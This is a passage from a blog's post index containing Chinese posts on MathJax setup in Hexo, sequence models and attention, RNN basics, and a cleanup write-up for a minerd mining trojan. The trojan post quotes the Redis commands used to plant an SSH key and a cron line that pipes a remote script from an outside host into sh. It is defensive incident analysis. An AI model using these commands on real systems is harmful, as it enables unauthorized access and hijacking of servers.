%&gt;&lt;%- partial('mathjax') %&gt;&lt;% } %&gt; 解决MarkDown与MathJax渲染冲突添加MathJax后写几个公式发现渲染出了很多问题，原因是Hexo默认先使用hexo-renderer-marked引擎渲染MarkDown，然后再交给MathJax渲染。hexo-renderer-marked会把一些特殊的markdown符号转换为相应的html标签，比如在markdown语法中，下划线 代表斜体，会被转化为&lt; em>标签，\\也会被转义成一个\\。而类Latex格式书写的数学公式下划线 表示角标，\\表示公式换行，有特殊的含义，所以MathJax引擎在渲染数学公式的时候就会出错。 解决方法有人提出更换Hexo的MarkDown渲染引擎，用hexo-renderer-kramed 替换默认的hexo-renderer-marked引擎，但我看了下hexo-renderer-kramed的文档说明，如果用这个引擎的话，要改变我的MarkDown书写习惯，还是不用了，并且换了这个引擎还是没有完全解决问题。 最终解决方法是参考一篇博文中修改hexo-renderer-marked渲染引擎的js脚本，去掉对 _ 和\\的转义。Hexo默认的MarkDown渲染引擎hexo-renderer-marked会调用marked模块的marked.js脚本进行最终的解释，这个脚本在Hexo安装后的node_modules\\marked\\lib\\目录中。有两点修改： 针对下划线的问题，取消作为斜体转义，因为marked.js中*也是斜体的意思，所以取消掉的转义并不影响使用markdown，我平时一般不用斜体，就是用也更习惯用*作为斜体标记。针对marked.js与Mathjax对于个别字符二次转义的问题，我们只要不让marked.js去转义\\,{,}在MathJax中有特殊用途的字符就行了。编辑node_modules\\marked\\lib\\marked.js 脚本， 1234567891011【第一步】将451行的escape: /^\\\\([\\\\`*{}\\[\\]()# +\\-.!_&gt;])/,替换为escape: /^\\\\([`*\\[\\]()# +\\-.!_&gt;])/,这一步取消了对\\\\,\\{,\\}的转义(escape)【第二步】将459行的em: /^\\b_((?:[^_]|__)+?)_\\b|^\\*((?:\\*\\*|[\\s\\S])+?)\\*(?!\\*)/,替换为em:/^\\*((?:\\*\\*|[\\s\\S])+?)\\*(?!\\*)/,这一步取消了对斜体标记_的转义 这样带来一个问题就是，以后每次更换电脑，在新电脑上安装完Hexo环境后，都要手动修改marked.js文件。 MathJax公式书写公式书写依然按照MarkDown语法来，基本上也和LaTeX相同，单$符引住的是行内公式，双$符引住的是行间公式。 MathJax公式书写参考http://meta.math.stackexchange.com/questions/5020/mathjax-basic-tutorial-and-quick-reference MathJax行内公式含下划线_的公式$x_mu$ : $x_mu$希腊字符$\\sigma$ : $\\sigma$行内公式$y=ax+b$ : $y=ax+b$行内公式$\\cos 2\\theta = \\cos^2 \\theta - \\sin^2 \\theta = 2 \\cos^2 \\theta$ : $\\cos 2\\theta = \\cos^2 \\theta - \\sin^2 \\theta = 2 \\cos^2 \\theta$行内公式$M(\\beta^{\\ast}(D),D) \\subseteq C$ : $M(\\beta^{\\ast}(D),D) \\subseteq C$ MathJax行间公式行间公式 $$ \\sum_{i=0}^n i^2 = \\frac{(n^2+n)(2n+1)}{6} $$： \\sum_{i=0}^n i^2 = \\frac{(n^2+n)(2n+1)}{6}行间公式 $$ x = \\dfrac{-b \\pm \\sqrt{b^2 - 4ac}}{2a} $$： x = \\dfrac{-b \\pm \\sqrt{b^2 - 4ac}}{2a}MathJax大括号右多行赋值双\\公式内换行，cases实现大括号右多行赋值，&amp;用来对齐1234567$$f(n) =\\begin{cases}n/2, &amp; \\text{if $n$ is even} \\\\3n+1, &amp; \\text{if $n$ is odd}\\end{cases}$$ f(n) = \\begin{cases} n/2, & \\text{if $n$ is even} \\\\ 3n+1, & \\text{if $n$ is odd} \\end{cases}MathJax多行公式对齐比如多行公式推导中常用的等号对齐begin{split} 表示开始多行公式，end{split}表示结束；公式中用\\表示回车到下一行，&amp;表示对齐的位置。12345678910$$\\begin{equation}\\begin{split}\\frac{\\partial^2 f}{\\partial{x^2}} &amp;= \\frac{\\partial(\\Delta_x f(i,j))}{\\partial x} = \\frac{\\partial(f(i+1,j)-f(i,j))}{\\partial x} \\\\&amp;= \\frac{\\partial f(i+1,j)}{\\partial x} - \\frac{\\partial f(i,j)}{\\partial x} \\\\&amp;= f(i+2,j) -2f(f+1,j) + f(i,j)\\end{split}\\nonumber\\end{equation}$$ \\begin{equation} \\begin{split} \\frac{\\partial^2 f}{\\partial{x^2}} &= \\frac{\\partial(\\Delta_x f(i,j))}{\\partial x} = \\frac{\\partial(f(i+1,j)-f(i,j))}{\\partial x} \\\\ &= \\frac{\\partial f(i+1,j)}{\\partial x} - \\frac{\\partial f(i,j)}{\\partial x} \\\\ &= f(i+2,j) -2f(f+1,j) + f(i,j) \\end{split} \\nonumber \\end{equation}MathJax公式自动编号要想MathJax支持公式编号，需添加AMS支持，在脚本中添加如下MathJax配置项：12345&lt;script type=\"text/x-mathjax-config\"&gt;MathJax.Hub.Config({ TeX: { equationNumbers: { autoNumber: \"AMS\" } }});&lt;/script&gt; MathJax.Hub.Config({ TeX: { equationNumbers: { autoNumber: \"AMS\" } } }); 我上面mathjax.ejs脚本中已加入公式编号的配置。书写时只要使用begin{equation}环境就会自动编号：1234$$\\begin{equation}\\end{equation}$$注意此时会自动将文档内的所有begin{equation}公式连续编号，例如：12345678910$$\\begin{equation}\\sum_{i=0}^n F_i \\cdot \\phi (H, p_i) - \\sum_{i=1}^n a_i \\cdot ( \\tilde{x_i}, \\tilde{y_i}) + b_i \\cdot ( \\tilde{x_i}^2 , \\tilde{y_i}^2 )\\end{equation}$$$$\\begin{equation}\\beta^*(D) = \\mathop{argmin} \\limits_{\\beta} \\lambda {||\\beta||}^2 + \\sum_{i=1}^n max(0, 1 - y_i f_{\\beta}(x_i)) \\end{equation}$$ \\begin{equation} \\sum_{i=0}^n F_i \\cdot \\phi (H, p_i) - \\sum_{i=1}^n a_i \\cdot ( \\tilde{x_i}, \\tilde{y_i}) + b_i \\cdot ( \\tilde{x_i}^2 , \\tilde{y_i}^2 ) \\end{equation} \\begin{equation} \\beta^*(D) = \\mathop{argmin} \\limits_{\\beta} \\lambda {||\\beta||}^2 + \\sum_{i=1}^n max(0, 1 - y_i f_{\\beta}(x_i)) \\end{equation}禁止自动编号在end{equation}前加\\nonumber可禁止对此公式自动编号，例如：1234567891011$$\\begin{equation}\\sum_{i=0}^n F_i \\cdot \\phi (H, p_i) - \\sum_{i=1}^n a_i \\cdot ( \\tilde{x_i}, \\tilde{y_i}) + b_i \\cdot ( \\tilde{x_i}^2 , \\tilde{y_i}^2 )\\nonumber\\end{equation}$$$$\\begin{equation}\\beta^*(D) = \\mathop{argmin} \\limits_{\\beta} \\lambda {||\\beta||}^2 + \\sum_{i=1}^n max(0, 1 - y_i f_{\\beta}(x_i)) \\end{equation}$$ \\begin{equation} \\sum_{i=0}^n F_i \\cdot \\phi (H, p_i) - \\sum_{i=1}^n a_i \\cdot ( \\tilde{x_i}, \\tilde{y_i}) + b_i \\cdot ( \\tilde{x_i}^2 , \\tilde{y_i}^2 ) \\nonumber \\end{equation} \\begin{equation} \\beta^*(D) = \\mathop{argmin} \\limits_{\\beta} \\lambda {||\\beta||}^2 + \\sum_{i=1}^n max(0, 1 - y_i f_{\\beta}(x_i)) \\end{equation}MathJax公式手动编号可以在公式书写时使用\\tag{手动编号}添加手动编号，例如：12345$$\\begin{equation}\\sum_{i=0}^n F_i \\cdot \\phi (H, p_i) - \\sum_{i=1}^n a_i \\cdot ( \\tilde{x_i}, \\tilde{y_i}) + b_i \\cdot ( \\tilde{x_i}^2 , \\tilde{y_i}^2 ) \\tag{1.2.3}\\end{equation}$$ \\begin{equation} \\sum_{i=0}^n F_i \\cdot \\phi (H, p_i) - \\sum_{i=1}^n a_i \\cdot ( \\tilde{x_i}, \\tilde{y_i}) + b_i \\cdot ( \\tilde{x_i}^2 , \\tilde{y_i}^2 ) \\tag{1.2.3} \\end{equation}12345不加\\begin{equation}, \\end{equation}也可以，例如：$$\\beta^*(D) = \\mathop{argmin} \\limits_{\\beta} \\lambda {||\\beta||}^2 + \\sum_{i=1}^n max(0, 1 - y_i f_{\\beta}(x_i)) \\tag{我的公式3}$$ \\beta^*(D) = \\mathop{argmin} \\limits_{\\beta} \\lambda {||\\beta||}^2 + \\sum_{i=1}^n max(0, 1 - y_i f_{\\beta}(x_i)) \\tag{我的公式3}行内公式加\\tag{}后会自动成为行间公式，例如：1$z = (p_0, ..... , p_n) \\tag{公式21} $$z = (p_0, ….. , p_n) \\tag{公式21} $ 又如：12$ s = r cos(a+b) = r cos(a) cos(b) - r sin(a) sin(b) \\tag{1.1} $$ t = r sin(a+b) = r sin(a) cos(b) - r cos(a) sin(b) \\tag{1.2} $$ s = r cos(a+b) = r cos(a) cos(b) - r sin(a) sin(b) \\tag{1.1} $$ t = r sin(a+b) = r sin(a) cos(b) - r cos(a) sin(b) \\tag{1.2} $ 参考Automatic Equation Numberinghttp://docs.mathjax.org/en/latest/tex.html#automatic-equation-numbering 将下标放到正下方1、如果是数学符号，那么直接用\\limits命令放在正下方，如Max函数下面的取值范围，需要放在Max的正下方。可以如下实现：1$ \\max \\limits_{a&lt;x&lt;b}\\{f(x)\\} $$ \\max \\limits_{a&lt;x&lt;b}{f(x)} $ 2、若是普通符号，那么要用\\mathop先转成数学符号再用\\limits，如1$ \\mathop{a}\\limits_{i=1} $$ \\mathop{a}\\limits_{i=1} $ MathJax矩阵输入无括号矩阵：1234567$$\\begin{matrix}1 &amp; x &amp; x^2 \\\\1 &amp; y &amp; y^2 \\\\1 &amp; z &amp; z^2 \\\\\\end{matrix}$$ \\begin{matrix} 1 & x & x^2 \\\\ 1 & y & y^2 \\\\ 1 & z & z^2 \\\\ \\end{matrix}矩阵运算：123456789101112131415161718192021$$\\left( \\begin{array}{c} s \\\\ t \\end{array}\\right)=\\left( \\begin{array}{cc} cos(b) &amp; -sin(b) \\\\ sin(b) &amp; cos(b) \\end{array}\\right)\\left( \\begin{array}{c} x \\\\ y \\end{array}\\right)$$ \\left( \\begin{array}{c} s \\\\ t \\end{array} \\right) = \\left( \\begin{array}{cc} cos(b) & -sin(b) \\\\ sin(b) & cos(b) \\end{array} \\right) \\left( \\begin{array}{c} x \\\\ y \\end{array} \\right)有括号有竖线矩阵：12345678$$\\left[ \\begin{array}{cc|c} 1&amp;2&amp;3\\\\ 4&amp;5&amp;6 \\end{array}\\right] $$ \\left[ \\begin{array}{cc|c} 1&2&3\\\\ 4&5&6 \\end{array} \\right]行内小矩阵：1$\\bigl( \\begin{smallmatrix} a &amp; b \\\\ c &amp; d \\end{smallmatrix} \\bigr)$这是一个行内小矩阵$\\bigl( \\begin{smallmatrix} a &amp; b \\ c &amp; d \\end{smallmatrix} \\bigr)$，直接嵌入行内。","link":"/2017/09/20/%E5%9C%A8Hexo%E4%B8%AD%E6%B8%B2%E6%9F%93MathJax%E6%95%B0%E5%AD%A6%E5%85%AC%E5%BC%8F/"},{"title":"序列模型与注意力机制","text":"Seq2Seq 模型 $$ i\\hbar\\frac{\\partial}{\\partial t}\\psi=-\\frac{\\hbar^2}{2m}\\nabla^2\\psi+V\\psi $$ Seq2Seq（Sequence-to-Sequence）模型能够应用于机器翻译、语音识别等各种序列到序列的转换问题。一个 Seq2Seq 模型包含编码器（Encoder）和解码器（Decoder）两部分，它们通常是两个不同的 RNN。如下图所示，将编码器的输出作为解码器的输入，由解码器负责输出正确的翻译结果。 提出 Seq2Seq 模型的相关论文： Sutskever et al., 2014. Sequence to sequence learning with neural networks Cho et al., 2014. Learning phrase representaions using RNN encoder-decoder for statistical machine translation 这种编码器-解码器的结构也可以用于图像描述（Image captioning）。将 AlexNet 作为编码器，最后一层的 Softmax 换成一个 RNN 作为解码器，网络的输出序列就是对图像的一个描述。 图像描述的相关论文： Mao et. al., 2014. Deep captioning with multimodal recurrent neural networks Vinyals et. al., 2014. Show and tell: Neural image caption generator Karpathy and Fei Fei, 2015. Deep visual-semantic alignments for generating image descriptions 选择最可能的句子机器翻译用到的模型与语言模型相似，只是用编码器的输出作为解码器第一个时间步的输入（而非 0）。因此机器翻译的过程其实相当于建立一个条件语言模型。 由于解码器进行随机采样过程，输出的翻译结果可能有好有坏。因此需要找到能使条件概率最大化的翻译，即 arg \\ max_{y^{⟨1⟩}, ..., y^{⟨T_y⟩}}P(y^{⟨1⟩}, ..., y^{⟨T_y⟩} | x)鉴于贪心搜索算法得到的结果显然难以不符合上述要求，解决此问题最常使用的算法是 集束搜索（Beam Search）。 集束搜索集束搜索会考虑每个时间步多个可能的选择。设定一个 集束宽（Bean Width）B，代表了解码器中每个时间步的预选单词数量。例如 B=3，则将第一个时间步最可能的三个预选单词及其概率值 $P(\\hat y^{⟨1⟩}|x)$ 保存到计算机内存，以待后续使用。 第二步中，分别将三个预选词作为第二个时间步的输入，得到 $P(\\hat y^{⟨2⟩}|x, \\hat y^{⟨1⟩})$。 因为我们需要的其实是第一个和第二个单词对（而非只有第二个单词）有着最大概率，因此根据条件概率公式，有： $P(\\hat y^{⟨1⟩}, \\hat y^{⟨2⟩}|x) = P(\\hat y^{⟨1⟩}|x) P(\\hat y^{⟨2⟩}|x, \\hat y^{⟨1⟩})$ 设词典中有 $N$ 个词，则当 $B=3$ 时，有 $3*N$ 个 $P(\\hat y^{⟨1⟩}, \\hat y^{⟨2⟩}|x)$。仍然取其中概率值最大的 3 个，作为对应第一个词条件下的第二个词的预选词。以此类推，最后输出一个最优的结果，即结果符合公式： arg \\ max \\prod^{T_y}_{t=1} P(\\hat y^{⟨t⟩} | x, \\hat y^{⟨1⟩}, ..., \\hat y^{⟨t-1⟩})可以看到，当 $B=1$ 时，集束搜索就变为贪心搜索。 优化：长度标准化长度标准化（Length Normalization）是对集束搜索算法的优化方式。对于公式 arg \\ max \\prod^{T_y}_{t=1} P(\\hat y^{⟨t⟩} | x, \\hat y^{⟨1⟩}, ..., \\hat y^{⟨t-1⟩})当多个小于 1 的概率值相乘后，会造成 数值下溢（Numerical Underflow），即得到的结果将会是一个电脑不能精确表示的极小浮点数。因此，我们会取 log 值，并进行标准化： arg \\ max \\frac{1}{T_y^{\\alpha}} \\sum^{T_y}_{t=1} logP(\\hat y^{⟨t⟩} | x, \\hat y^{⟨1⟩}, ..., \\hat y^{⟨t-1⟩})其中，$T_y$ 是翻译结果的单词数量，$α$ 是一个需要根据实际情况进行调节的超参数。标准化用于减少对输出长的结果的惩罚（因为翻译结果一般没有长度限制）。 关于集束宽 B 的取值，较大的 B 值意味着可能更好的结果和巨大的计算成本；而较小的 B 值代表较小的计算成本和可能表现较差的结果。通常来说，B 可以取一个 10 以下的值。 和 BFS、DFS 等精确的查找算法相比，集束搜索算法运行速度更快，但是不能保证一定找到 arg max 准确的最大值。 误差分析集束搜索是一种启发式搜索算法，其输出结果不总为最优。当结合 Seq2Seq 模型和集束搜索算法所构建的系统出错（没有输出最佳翻译结果）时，我们通过误差分析来分析错误出现在 RNN 模型还是集束搜索算法中。 例如，对于下述两个由人工和算法得到的翻译结果： Human: Jane visits Africa in September. (y∗)Algorithm: Jane visited Africa last September. (y∗) 将翻译中没有太大差别的前三个单词作为解码器前三个时间步的输入，得到第四个时间步的条件概率 $P(y^* | x)$ 和 $P(\\hat y | x)$，比较其大小并分析： 如果 $P(y^ | x) &gt; P(\\hat y | x)$，说明是集束搜索算法出现错误，没有选择到概率最大的词；如果 $P(y^ | x) \\le P(\\hat y | x)$，说明是 RNN 模型的效果不佳，预测的第四个词为“in”的概率小于“last”。建立一个如下图所示的表格，记录对每一个错误的分析，有助于判断错误出现在 RNN 模型还是集束搜索算法中。如果错误出现在集束搜索算法中，可以考虑增大集束宽 B；否则，需要进一步分析，看是需要正则化、更多数据或是尝试一个不同的网络结构。 Bleu 得分Bleu（Bilingual Evaluation Understudy） 得分用于评估机器翻译的质量，其思想是机器翻译的结果越接近于人工翻译，则评分越高。 最原始的 Bleu 将机器翻译结果中每个单词在人工翻译中出现的次数作为分子，机器翻译结果总词数作为分母得到。但是容易出现错误，例如，机器翻译结果单纯为某个在人工翻译结果中出现的单词的重复，则按照上述方法得到的 Bleu 为 1，显然有误。改进的方法是将每个单词在人工翻译结果中出现的次数作为分子，在机器翻译结果中出现的次数作为分母。 上述方法是以单个词为单位进行统计，以单个词为单位的集合称为unigram（一元组）。而以成对的词为单位的集合称为bigram（二元组）。对每个二元组，可以统计其在机器翻译结果（$count$）和人工翻译结果（$count_{clip}$）出现的次数，计算 Bleu 得分。 以此类推，以 n 个单词为单位的集合称为n-gram（多元组），对应的 Blue（即翻译精确度）得分计算公式为： p_n = \\frac{\\sum_{\\text{n-gram} \\in \\hat y}count_{clip}(\\text{n-gram})}{\\sum_{\\text{n-gram} \\in \\hat y}count(\\text{n-gram})}对 N 个 pn 进行几何加权平均得到： p_{ave} = exp(\\frac{1}{N}\\sum^N_{i=1}log^{p_n})有一个问题是，当机器翻译结果短于人工翻译结果时，比较容易能得到更大的精确度分值，因为输出的大部分词可能都出现在人工翻译结果中。改进的方法是设置一个最佳匹配长度（Best Match Length），如果机器翻译的结果短于该最佳匹配长度，则需要接受 简短惩罚（Brevity Penalty，BP）： BP = \\begin{cases} 1, &MT\\_length \\ge BM\\_length \\\\ exp(1 - \\frac{MT\\_length}{BM\\_length}), &MT\\_length \\lt BM\\_length \\end{cases}因此，最后得到的 Bleu 得分为： Blue = BP \\times exp(\\frac{1}{N}\\sum^N_{i=1}log^{p_n})Bleu 得分的贡献是提出了一个表现不错的单一实数评估指标，因此加快了整个机器翻译领域以及其他文本生成领域的进程。 相关论文：neni et. al., 2002. A method for automatic evaluation of machine translation 注意力模型对于一大段文字，人工翻译一般每次阅读并翻译一小部分。因为难以记忆，很难每次将一大段文字一口气翻译完。同理，用 Seq2Seq 模型建立的翻译系统，对于长句子，Blue 得分会随着输入序列长度的增加而降低。 实际上，我们也并不希望神经网络每次去“记忆”很长一段文字，而是想让它像人工翻译一样工作。因此，注意力模型（Attention Model）被提出。目前，其思想已经成为深度学习领域中最有影响力的思想之一。 注意力模型的一个示例网络结构如上图所示。其中，底层是一个双向循环神经网络（BRNN），该网络中每个时间步的激活都包含前向传播和反向传播产生的激活： a^{\\langle t’ \\rangle} = ({\\overrightarrow a}^{\\langle t’ \\rangle}, {\\overleftarrow a}^{\\langle t’ \\rangle})顶层是一个“多对多”结构的循环神经网络，第 t 个时间步的输入包含该网络中前一个时间步的激活 $s^{\\langle t-1 \\rangle}$、输出 $y^{\\langle t-1 \\rangle}$ 以及底层的 BRNN 中多个时间步的激活 c，其中 c 有（注意分辨 α 和 a）： c^{\\langle t \\rangle} = \\sum_{t’}\\alpha^{\\langle t,t’ \\rangle}a^{\\langle t’ \\rangle}其中，参数 $\\alpha^{\\langle t,t’ \\rangle}$ 即代表着 $y^{\\langle t \\rangle}$ 对 $a^{\\langle t’ \\rangle}$ 的“注意力”，总有： \\sum_{t’}\\alpha^{\\langle t,t’ \\rangle} = 1我们使用 Softmax 来确保上式成立，因此有： \\alpha^{\\langle t,t’ \\rangle} = \\frac{exp(e^{\\langle t,t’ \\rangle})}{\\sum^{T_x}_{t'=1}exp(e^{\\langle t,t’ \\rangle})}而对于 $e^{\\langle t,t’ \\rangle}$，我们通过神经网络学习得到。输入为 $s^{\\langle t-1 \\rangle}$ 和 $a^{\\langle t’ \\rangle}$，如下图所示： 注意力模型的一个缺点是时间复杂度为 $O(n^3)$。 相关文章：带Attention机制的Seq2Seq框架梳理 相关论文： Bahdanau et. al., 2014. Neural machine translation by jointly learning to align and translate Xu et. al., 2015. Show, Attend and Tell: Neural Image Caption Generation with Visual Attention：将注意力模型应用到图像标注中 语音识别在语音识别任务中，输入是一段以时间为横轴的音频片段，输出是文本。 音频数据的常见预处理步骤是运行音频片段来生成一个声谱图，并将其作为特征。以前的语音识别系统通过语言学家人工设计的音素（Phonemes）来构建，音素 指的是一种语言中能区别两个词的最小语音单位。现在的端到端系统中，用深度学习就可以实现输入音频，直接输出文本。 对于训练基于深度学习的语音识别系统，大规模的数据集是必要的。学术研究中通常使用 3000 小时长度的音频数据，而商业应用则需要超过一万小时的数据。 语音识别系统可以用注意力模型来构建，一个简单的图例如下： 用 CTC（Connectionist Temporal Classification）损失函数来做语音识别的效果也不错。由于输入是音频数据，使用 RNN 所建立的系统含有很多个时间步，且输出数量往往小于输入。因此，不是每一个时间步都有对应的输出。CTC 允许 RNN 生成下图红字所示的输出，并将两个空白符（blank）中重复的字符折叠起来，再将空白符去掉，得到最终的输出文本。 相关论文：Graves et al., 2006. Connectionist Temporal Classification: Labeling unsegmented sequence data with recurrent neural networks 触发词检测触发词检测（Trigger Word Detection）常用于各种智能设备，通过约定的触发词可以语音唤醒设备。 使用 RNN 来实现触发词检测时，可以将触发词对应的序列的标签设置为“1”，而将其他的标签设置为“0”。 代码示例序列模型和注意力机制","link":"/2018/03/10/%E5%BA%8F%E5%88%97%E6%A8%A1%E5%9E%8B%E4%B8%8E%E6%B3%A8%E6%84%8F%E5%8A%9B%E6%9C%BA%E5%88%B6/"},{"title":"彻底清除Linux centos minerd木马","text":"前几天，公司两台linux服务器，一台访问速度很慢，cpu跑满，一台免密码登录失效，公钥文件被改写成redis的key。用htop命令查询发现了minerd木马进程，初步猜测是redis没有配访问权限造成的。网上查询minerd木马，发现这是一个很常见的挖矿程序，相关猜测也得到了验证。 下文是网上搜索到的清除minerd木马方法，和我遇到的情况一模一样。 现状描述1、top可以看到，这个minerd 程序把cpu跑满了 2、ps aux | grep minerd可知是这个程序: /opt/minerd 这个不是我们自己启动的，可以断定服务器被黑了这个进程是root用户启动的，代码有漏洞可能性不大（web服务是www用户启动的），多半黑客已经登录服务器了 3、有可能是免密登录了，去/root/.ssh 目录下，并没有发现authorized_keys，但发现了KHK75NEOiq这个文件 查看 vim KHK75NEOiq可以看到内容就是免密码登录的公钥 4、在ssh的配置文件/etc/ssh/sshd_config中也可以看到把AuthorizedKeysFile指向了这个文件了（.ssh/KHK75NEOiq） 猜想是这样的：通过authorized_keys免密码登录后，在这个目录下创建了KHK75NEOiq这个文件，修改了AuthorizedKeysFile的指向，就把authorized_keys这个文件删除了。 5、那么是写进来authorized_keys的那？ 之前我处理过类似的问题，是redis未授权导致的，也就是说外网可以直接不用密码登录我的redis, 连上redis后，通过以下命令即可创建文件： **config set dir /root/.ssh config set dbfilename authorized_keys set key value，其中value为生成公钥，即可将公钥保存在服务器，使得登录时不需要输入账号与密码。** 先堵住免登录漏洞1、修改ssh端口编辑/etc/ssh/sshd_config文件中的Port 22将22修改为其他端口 2、禁止root用户登陆编辑/etc/ssh/sshd_config文件中的PermitRootLogin 修改为no 3、修改无密码登陆的文件路径编辑/etc/ssh/sshd_config文件中的AuthorizedKeysFile 修改为其他文件路径 4、删除 .ssh下的 KHK75NEOiq 5、不让外网直接连接在 redis.conf 文件中找到#bind 127.0.0.1，把前面的#号去掉，重启 找到木马守护进程1、通常直接kill掉进程，是不好使的，肯定有守护进程，还有系统自启动，所以清理步骤是这样的：1）干掉守护进程2）干掉系统自启动3）干掉木马进程 找到木马守护进程并干掉 守护进程有大概有两种存在形式，crontab 和常驻进程，常驻进程得慢慢分析，我们先看crontab，有一条不是我创建的任务。任务是：直接从远程下载一个脚本pm.sh 并执行。 2、我们来看看这个脚本 3、大致逻辑是这样的：1）把 /10 * curl -fsSL http://r.chanstring.com/pm.sh?0706 | sh 写入crontab2）把authorized_keys删掉，并创建免登录文件/root/.ssh/KHK75NEOiq，修改ssh配置重启3）curl下载/opt/KHK75NEOiq33 这个文件，并执行安装（/opt/KHK75NEOiq33 —Install），然后启动ntp 4、基本可以断定这个ntp就是守护进程，但看到ntp真的有些怕怕，ntp不是搞时间同步的吗，其实 Linux正常的ntp服务叫ntpd，并非ntp，很有迷惑性啊 5、但为了让自己放心，还是校验了一番我们先从时间上校验，ntp是不是木马任务后创建的 查看这个木马任务第一次执行的时间去/var/log下看cron的日志 6、Jul 24 09:23:01 第一次执行： curl -L http://r.chanstring.com/pm.sh?0703Jul 24 09:30:01 第一次我们目前crontab里的任务：curl -fsSL http://r.chanstring.com/pm.sh?0706Jul 24 09:49 脚本/etc/init.d/ntp的创建时间 从pm.sh这个脚本可知 curl下来/opt/KHK75NEOiq33这个文件，并执行安装 /opt/KHK75NEOiq33 —Install 比较耗时间，我执行了一下，在我的机器上是10多分钟。 所以创建时间上基本吻合 7、我们看一下ntp的随系统启动runlevel 2 3 4 5都启动了，够狠的呀 8、看一下常用的3吧可以看到 有个S50ntp 软链了脚本/etc/init.d/ntp 9、我们查看系统启动日志vim /var/log/boot.log有一条是Staring S50ntp，这个基本对应脚本/etc/init.d/ntp 中的 echo “Starting $name” 10、我们来看一下 /etc/init.d/ntp 这个脚本$name应该就对应的值是 S50ntp，通过stdout_log,stderr_log,pid_file也得到了验证。 11、通过搜索安装文件（/opt/KHK75NEOiq33），可知看到 /opt/KHK75NEOiq33 —Install的过程中写入了ntp脚本 自启动 /opt/minerd等一系列的操作。 12、打开 /usr/local/etc/minerd.conf，内容就是/opt/minerd这个进程后的一些参数 13、好了 验证完毕，可以干掉这个ntp了 清理木马1、去掉crontab文件中的有关木马内容：/var/spool/cron/crontabs/root/var/spool/cron/root 2、干掉守护进程ntp，并删除相关文件 3、干掉木马进程及其文件 4、干掉安装文件及免密登录的文件 5、干掉随系统启动的文件 6、top一下 一切都正常了！ 7、重启一下，也没问题了","link":"/2016/10/26/%E5%BD%BB%E5%BA%95%E6%B8%85%E9%99%A4Linux%20centos%20minerd%E6%9C%A8%E9%A9%AC/"},{"title":"循环训练模型","text":"前言自然语言和音频都是前后相互关联的数据，对于这些序列数据需要使用循环神经网络（Recurrent Neural Network，RNN）来进行处理。 使用 RNN 实现的应用包括下图中所示： 数学符号对于一个序列数据 $x$ ，用符号 $x^{⟨t⟩}$ 来表示这个数据中的第 $t$ 个元素，用 $y^{⟨t⟩}$ 来表示第 $t$ 个标签，用 $T_x$ 和 $T_y$ 来表示输入和输出的长度。对于一段音频，元素可能是其中的几帧；对于一句话，元素可能是一到多个单词。 第 $i$ 个序列数据的第 $t$ 个元素用符号 $x^{(i)⟨t⟩}$，第 $t$ 个标签即为 $y^{(i)⟨t⟩}$。对应即有 $T^{(i)}_x$ 和 $T^{(i)}_y$。 想要表示一个词语，需要先建立一个词汇表（Vocabulary），或者叫字典（Dictionary）。将需要表示的所有词语变为一个列向量，可以根据字母顺序排列，然后根据单词在向量中的位置，用 one-hot 向量（one-hot vector）来表示该单词的标签：将每个单词编码成一个 $R^{|V| \\times 1}$ 向量，其中 |V| 是词汇表中单词的数量。一个单词在词汇表中的索引在该向量对应的元素为 1，其余元素均为 0。 例如，’zebra’排在词汇表的最后一位，因此它的词向量表示为： w^{zebra} = \\left [ 0, 0, 0, ..., 1\\right ]^T补充：one-hot 向量是最简单的词向量。它的缺点是，由于每个单词被表示为完全独立的个体，因此单词间的相似度无法体现。例如单词 hotel 和 motel 意思相近，而与 cat 不相似，但是 (w^{hotel})^Tw^{motel} = (w^{hotel})^Tw^{cat} = 0 循环神经网络模型RNN 的目的是用来处理序列数据。在传统的神经网络模型中，是从输入层到隐含层再到输出层，层与层之间是全连接的，每层之间的节点是无连接的。但是这种普通的神经网络对于很多问题却无能无力。 比如对于序列数据，使用标准神经网络存在以下问题： 对于不同的示例，输入和输出可能有不同的长度，因此输入层和输出层的神经元数量无法固定。 从输入文本的不同位置学到的同一特征无法共享。 模型中的参数太多，计算量太大。 为了解决这些问题，引入循环神经网络（Recurrent Neural Network，RNN）。RNN之所以称为循环神经网路，因为一个序列当前的输出与前面的输出也有关。 一种循环神经网络的结构如下图所示： 当元素 $x^{⟨t⟩}$ 输入对应时间步（Time Step）的隐藏层的同时，该隐藏层也会接收来自上一时间步的隐藏层的激活值 $a^{⟨t-1⟩}$，其中 $a^{⟨0⟩}$ 一般直接初始化为零向量。一个时间步输出一个对应的预测结果 $\\hat y^{⟨t⟩}$。 循环神经网络从左向右扫描数据，同时每个时间步的参数也是共享的，输入、激活、输出的参数对应为 $W{ax}$、$W{aa}$、$W_{ay}$。 目前我们看到的模型的问题是，只使用了这个序列中之前的信息来做出预测，即后文没有被使用。可以通过双向循环神经网络（Bidirectional RNN，BRNN）来解决这个问题。 前向传播过程的公式如下： 激活函数 $g_1$ 通常选择 tanh，有时也用 ReLU；g2可选 sigmoid 或 softmax，取决于需要的输出类型。 为了进一步简化公式以方便运算，可以将 $W{ax}$、$W{aa}$水平并列为一个矩阵 $W_{a}$，同时 $a^{⟨t-1⟩}$和 $x^{⟨t⟩}$ 堆叠成一个矩阵。则有： RNN反向传播为了计算反向传播过程，需要先定义一个损失函数。单个位置上（或者说单个时间步上）某个单词的预测值的损失函数采用 交叉熵损失函数，如下所示： L^{⟨t⟩}(\\hat y^{⟨t⟩}, y^{⟨t⟩}) = -y^{⟨t⟩}log\\hat y^{⟨t⟩} - (1 - y^{⟨t⟩})log(1-\\hat y^{⟨t⟩})将单个位置上的损失函数相加，得到整个序列的成本函数如下： J = L(\\hat y, y) = \\sum^{T_x}_{t=1} L^{⟨t⟩}(\\hat y^{⟨t⟩}, y^{⟨t⟩})循环神经网络的反向传播被称为 通过时间反向传播（Backpropagation through time），因为从右向左计算的过程就像是时间倒流。 更详细的计算公式如下： 附DNN前向反向传播公式： 不同结构某些情况下，输入长度和输出长度不一致。根据所需的输入及输出长度，循环神经网络可分为“一对一”、“多对一”、“多对多”等结构： 语言模型语言模型（Language Model）是根据语言客观事实而进行的语言抽象数学建模，能够估计某个序列中各元素出现的可能性。例如，在一个语音识别系统中，语言模型能够计算两个读音相近的句子为正确结果的概率，以此为依据作出准确判断。 建立语言模型所采用的训练集是一个大型的 语料库（Corpus），指数量众多的句子组成的文本。建立过程的第一步是 标记化（Tokenize），即建立字典；然后将语料库中的每个词表示为对应的 one-hot 向量。另外，需要增加一个额外的标记 EOS（End of Sentence）来表示一个句子的结尾。标点符号可以忽略，也可以加入字典后用 one-hot 向量表示。 